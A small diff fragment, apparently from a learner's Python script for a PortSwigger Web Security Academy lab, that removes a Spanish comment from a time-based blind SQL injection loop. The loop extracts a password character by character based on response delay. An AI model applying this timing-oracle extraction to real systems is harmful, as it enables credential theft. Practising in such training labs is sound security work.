@@ -139,7 +139,6 @@ def makeSQLi():
 
             r = requests.get("https://0af800a80464eb21853f806c00cc0071.web-security-academy.net/", cookies=cookies)
 
-            # Cambio mínimo: usamos elapsed.total_seconds() en lugar de medir con time.time()
             if r.elapsed.total_seconds() > 2:
                 password += character
                 p2.status(password)
